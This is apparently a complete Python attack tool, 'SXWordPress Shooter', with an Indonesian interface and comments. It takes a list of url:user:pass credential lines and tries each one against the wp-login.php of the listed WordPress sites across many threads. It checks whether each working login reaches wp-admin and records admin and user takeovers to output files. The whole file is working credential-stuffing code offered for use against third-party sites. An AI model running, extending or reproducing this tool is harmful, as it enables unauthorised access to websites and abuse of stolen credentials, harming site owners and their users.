import requests
import os
import threading
import argparse
import re
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

from rich.console import Console, Group
from rich.live import Live
from rich.progress import (
    Progress, BarColumn, TextColumn,
    MofNCompleteColumn, TimeElapsedColumn,
    SpinnerColumn, TaskProgressColumn,
)
from rich.text import Text

console = Console(highlight=False)

BANNER = r"""
. . . ___________________________ 
                                            __----~~~~~~~~~~~------___
                                 .  .   ~~//====......          __--~ ~~
                  -.            \_|//     |||\\  ~~~~~~::::... /~
               ___-==_       _-~o~  \/    |||  \\            _/~~-
       __---~~~.==~||\=_    -_--~/_-~|-   |\\   \\        _/~
   _-~~     .=~    |  \\-_    '-~7  /-   /  ||    \      /
  ~       .~       |   \\ -_    /  /-   /   ||      \   /
/  ____  /         |     \\ ~-_/  /|- _/   .||       \ /
|~~    ~~|--~~~~--_ \     ~==-/   | \~--===~~        .\
         '         ~-|      /|    |-~\~~       __--~~
                     |-~~-_/ |    |   ~\_   _-~            /\
                          /  \     \__   \/~                \__
                      _--~ _/ | .-~~____--~-/                  ~~==.
                     ((->/~   '.|||' -_|    ~~-/ ,              . _||
                               -_     ~\      ~~---l__i__i__i--~~_/
 [ SXWordPress Shooter ]        _-~-__   ~)  \--______________--~~
       -sxtools-              //.-~~~-~_--~- |-------~~~~~~~~
                                     //.-~~~--\

[Malicious Folks - IDN. still l4m3r]________________ . . .
"""

output_lock = threading.Lock()


class ShooterArgumentParser(argparse.ArgumentParser):
    def error(self, message):
        console.print(f"[red][!] {message}[/red]\n")
        self.print_help()
        self.exit(2)


def parse_payload_line(line):
    line = line.strip()
    if not line:
        return None, None, None
    match = re.match(r"^(https?://[^:]+):([^:]+):(.+)$", line)
    if not match:
        return None, None, None
    return match.group(1).strip(), match.group(2).strip(), match.group(3).strip()


def attempt_login(target_url, username, password, wp_path):
    base_url = target_url.rstrip("/")
    path = (wp_path or "").strip()
    if path and not path.startswith("/"):
        path = "/" + path
    full_base = f"{base_url}{path}"
    login_url = f"{full_base}/wp-login.php"
    session   = requests.Session()
    data = {
        "log": username, "pwd": password,
        "wp-submit": "Log In",
        "redirect_to": f"{full_base}/wp-admin/",
        "testcookie": "1",
    }
    try:
        response = session.post(login_url, data=data, allow_redirects=True, timeout=15)
    except Exception:
        return False, "not_vuln", None, False

    has_logged_cookie = "wordpress_logged_in" in "".join(session.cookies.keys())
    login_body = (response.text or "").lower()
    twofa_phrases = [
        "two-factor authentication", "2fa verification code",
        "two factor authentication", "authentication code:", "use a backup code",
    ]
    is_2fa = any(p in login_body for p in twofa_phrases)

    if not has_logged_cookie:
        status = "blocked" if response.status_code in (401, 402, 403, 500) else "not_vuln"
        return False, status, response.url, is_2fa

    try:
        admin_resp = session.get(f"{full_base}/wp-admin/", allow_redirects=True, timeout=15)
        admin_body = (admin_resp.text or "").lower()
        forbidden_phrases = [
            "you are not allowed to access this page",
            "you do not currently have privileges on this site",
            "you do not have sufficient permissions",
            "the current user doesn't have the",
            "you don't have permission to access this resource",
        ]
        forbidden = any(p in admin_body for p in forbidden_phrases)
        is_2fa    = is_2fa or any(p in admin_body for p in twofa_phrases)
        is_admin  = (
            "/wp-admin" in admin_resp.url.lower()
            and not forbidden
            and admin_resp.status_code not in (401, 403)
        )
    except Exception:
        is_admin = True

    return True, ("admin" if is_admin else "user"), response.url, is_2fa


def process_target(line, wp_path):
    url, user, password = parse_payload_line(line)
    if not url:
        return None
    success, status, final_url, is_2fa = attempt_login(url, user, password, wp_path)
    return url, user, password, success, status, final_url, is_2fa


def main():
    parser = ShooterArgumentParser(
        description="SXWordPress Shooter V.10 - sxtools",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    parser.add_argument("-i", "--input",   required=True, help="path ke file payload (url:user:pass)")
    parser.add_argument("-t", "--threads", type=int, default=10, help="jumlah thread (default: 10)")
    parser.add_argument("-path", "--path", default="", help="sub-path WP, misal /blog")
    args = parser.parse_args()

    os.system("cls" if os.name == "nt" else "clear")

    if not os.path.isfile(args.input):
        console.print(f"[red][!] File tidak ditemukan: {args.input}[/red]")
        return

    with open(args.input, "r", encoding="utf-8", errors="ignore") as f:
        lines = [l for l in f if l.strip()]
    if not lines:
        console.print("[red][!] File kosong.[/red]")
        return

    run_dir = os.path.join(
        os.getcwd(), "output",
        f"sxwp-vuln-{datetime.now().strftime('%Y%m%d-%H%M%S')}"
    )
    os.makedirs(run_dir, exist_ok=True)

    total = len(lines)
    vuln = not_vuln = blocked = admin_c = user_c = 0

    # ── Banner & Info (dicetak sekali, tidak berubah) ─────────────────────────
    console.print(f"[green]{BANNER}[/green]")
    console.print(f"[cyan] [🔫] Target: {total}  |  Threads: {args.threads}[/cyan]\n")

    # ── Progress bar ──────────────────────────────────────────────────────────
    progress = Progress(
        SpinnerColumn(spinner_name="dots", style="cyan"),
        TextColumn(" [bold cyan]{task.percentage:>5.1f}%[/bold cyan]"),
        BarColumn(
            bar_width=38,
            style="grey23",
            complete_style="bright_green",
            finished_style="green",
            pulse_style="cyan",
        ),
        MofNCompleteColumn(),
        TimeElapsedColumn(),
        console=console,
        transient=True,
    )
    task_id = progress.add_task("scanning", total=total)

    def make_panel():
        """Live panel: stats (1 baris) + progress bar."""
        stats_text = Text()
        stats_text.append(f" Vuln: {vuln}", style="bold green")
        stats_text.append(f"  ✗ {not_vuln}", style="dim")
        stats_text.append(f"  Blocked: {blocked}", style="yellow")
        stats_text.append(f"  Admin: {admin_c}", style="bold red")
        stats_text.append(f"  User: {user_c}", style="bold yellow")
        return Group(stats_text, progress)

    # ── Main loop ─────────────────────────────────────────────────────────────
    # rich.Live: setiap live.console.print() akan muncul DI ATAS live panel.
    # Live panel (stats + progress) selalu ada di paling bawah layar.
    # Sehingga layout menjadi:
    #
    #   [Banner]                ← dicetak sekali sebelum Live
    #   [Info]                  ← dicetak sekali sebelum Live
    #   [ADMIN] log...          ← live.console.print → append di atas panel
    #   [USER]  log...          ← live.console.print → append di atas panel
    #   ─────────────────────── ← live panel (selalu di bawah)
    #    Vuln: X  ✗ Y  ...
    #    5.42% ████████── 13/19
    #
    with Live(make_panel(), console=console, refresh_per_second=10,
              vertical_overflow="visible", transient=True) as live:
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = [executor.submit(process_target, line, args.path) for line in lines]
            for future in as_completed(futures):
                res = future.result()
                with output_lock:
                    progress.advance(task_id)

                    if not res:
                        live.update(make_panel())
                        continue

                    url, user, pwd, success, status, _, is_2fa = res

                    if status == "blocked":
                        blocked += 1
                    elif success:
                        vuln += 1
                        if status == "admin":
                            admin_c += 1
                        else:
                            user_c += 1

                        ts    = datetime.now().strftime("%H:%M:%S")
                        extra = " [2FA]" if is_2fa else ""

                        # Cetak vuln log — muncul di atas live panel
                        if status == "admin":
                            live.console.print(
                                f"[red][ADMIN][/red] [{ts}] [bold]{url}[/bold] | {user}:{pwd}{extra}"
                            )
                        else:
                            live.console.print(
                                f"[yellow][USER][/yellow]  [{ts}] {url} | {user}:{pwd}{extra}"
                            )

                        fname = "admin.txt" if status == "admin" else "user.txt"
                        with open(os.path.join(run_dir, fname), "a", encoding="utf-8") as fh:
                            fh.write(f"{url}:{user}:{pwd}\n")
                    else:
                        not_vuln += 1

                    # Update live panel (stats + progress) — in-place, tidak scroll
                    live.update(make_panel())

    # ── Summary ───────────────────────────────────────────────────────────────
    console.print(f"[green][✓] Selesai! Output: {run_dir}[/green]\n")


if __name__ == "__main__":
    main()
